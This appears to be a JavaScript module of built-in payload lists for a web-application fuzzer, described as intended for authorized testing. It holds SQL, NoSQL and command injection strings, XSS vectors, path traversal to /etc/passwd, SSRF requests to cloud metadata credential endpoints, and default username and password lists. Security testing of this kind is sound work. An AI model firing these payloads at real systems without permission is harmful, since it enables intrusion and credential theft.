'use strict';

// Built-in payload sets for the fuzzer. Compact, high-signal lists intended
// for authorized testing. Larger wordlists can be pasted in the UI.

const SQLI = [
  "'",
  '"',
  "' OR '1'='1",
  "' OR '1'='1'-- -",
  '" OR "1"="1',
  "') OR ('1'='1",
  "1' ORDER BY 1-- -",
  "1' ORDER BY 50-- -",
  "1 UNION SELECT NULL-- -",
  "' UNION SELECT NULL,NULL-- -",
  "'; WAITFOR DELAY '0:0:5'-- -",
  "1 AND SLEEP(5)",
  "' AND SLEEP(5)-- -",
  "%27",
  "admin'-- -",
  "' OR 1=1#",
];

const XSS = [
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "'><svg/onload=alert(1)>",
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '"><img src=x onerror=alert(1)>',
  '{{7*7}}',
  '${7*7}',
  '<svg onload=alert(document.domain)>',
];

const PATH_TRAVERSAL = [
  '../../../../etc/passwd',
  '..%2f..%2f..%2f..%2fetc%2fpasswd',
  '....//....//....//etc/passwd',
  '..\\..\\..\\..\\windows\\win.ini',
  '/etc/passwd',
  'file:///etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '../../../../../../etc/passwd%00',
];

const CMDI = [
  '; id',
  '| id',
  '|| id',
  '`id`',
  '$(id)',
  '; sleep 5',
  '| sleep 5',
  '& ping -c 3 127.0.0.1 &',
  '%0a id',
  "'; id; '",
];

const SSRF = [
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://127.0.0.1:80',
  'http://localhost:6379',
  'http://[::1]/',
  'http://0.0.0.0:8080',
  'file:///etc/passwd',
  'gopher://127.0.0.1:6379/_',
];

const LFI_RFI = [
  'php://filter/convert.base64-encode/resource=index.php',
  'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
  'expect://id',
  '/proc/self/environ',
  '/var/log/apache2/access.log',
];

const NOSQLI = [
  '{"$gt":""}',
  '{"$ne":null}',
  "[$ne]=1",
  "';return true;var x='",
  '{"$where":"sleep(5000)"}',
  "', $where: '1 == 1",
];

const COMMON_USERNAMES = [
  'admin',
  'administrator',
  'root',
  'test',
  'user',
  'guest',
  'demo',
  'api',
  'service',
  'support',
  'superadmin',
  'operator',
];

const COMMON_PASSWORDS = [
  'password',
  'Password1',
  'Password123',
  'admin',
  'admin123',
  '123456',
  '12345678',
  'qwerty',
  'letmein',
  'changeme',
  'welcome',
  'P@ssw0rd',
  'root',
  'test123',
  'Welcome1',
];

const AUTH_BYPASS = [
  'true',
  'false',
  '1',
  '0',
  'null',
  'undefined',
  'admin',
  '*',
  '%00',
];

const HTTP_HEADERS_HOST = [
  'localhost',
  '127.0.0.1',
  'internal.local',
  'evil.com',
  '169.254.169.254',
];

// Generate a numeric range for IDOR / object-id enumeration.
function numericRange(start, end, step = 1) {
  const out = [];
  const s = Number(start);
  const e = Number(end);
  const st = Math.max(1, Number(step) || 1);
  if (!Number.isFinite(s) || !Number.isFinite(e)) return out;
  if (s <= e) {
    for (let i = s; i <= e && out.length < 100000; i += st) out.push(String(i));
  } else {
    for (let i = s; i >= e && out.length < 100000; i -= st) out.push(String(i));
  }
  return out;
}

const SETS = {
  sqli: { label: 'SQL Injection', payloads: SQLI },
  xss: { label: 'XSS', payloads: XSS },
  'path-traversal': { label: 'Path Traversal / LFI', payloads: PATH_TRAVERSAL },
  cmdi: { label: 'Command Injection', payloads: CMDI },
  ssrf: { label: 'SSRF', payloads: SSRF },
  lfi: { label: 'LFI / RFI Wrappers', payloads: LFI_RFI },
  nosqli: { label: 'NoSQL Injection', payloads: NOSQLI },
  usernames: { label: 'Common Usernames', payloads: COMMON_USERNAMES },
  passwords: { label: 'Common Passwords', payloads: COMMON_PASSWORDS },
  'auth-bypass': { label: 'Auth Bypass Values', payloads: AUTH_BYPASS },
  'host-header': { label: 'Host Header Injection', payloads: HTTP_HEADERS_HOST },
};

function listSets() {
  return Object.entries(SETS).map(([key, v]) => ({
    key,
    label: v.label,
    count: v.payloads.length,
  }));
}

function getSet(key) {
  return SETS[key] ? SETS[key].payloads.slice() : [];
}

module.exports = { SETS, listSets, getSet, numericRange };
